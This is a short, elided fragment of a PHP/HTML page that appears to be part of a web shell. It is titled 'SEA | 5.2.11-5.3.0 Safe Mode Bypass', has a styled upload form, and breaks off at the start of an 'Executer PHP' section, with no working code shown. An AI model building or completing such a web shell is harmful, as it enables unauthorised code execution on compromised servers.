...
<html>
<head>
<title>SEA | 5.2.11-5.3.0 Safe Mode Bypass .</title>
...
<form enctype="multipart/form-data" method="POST">
  ...
  <tr>
<td width='24%' height='21' style="background:<?php echo $sh3llColor; ?>">5.2.11-5.3.0 Bypass</td>
...
<!-- End Of 5.2.11-5.3.0 Safe Mode Bypass -->
</center>
<?php
# --------------------------
#   Executer PHP
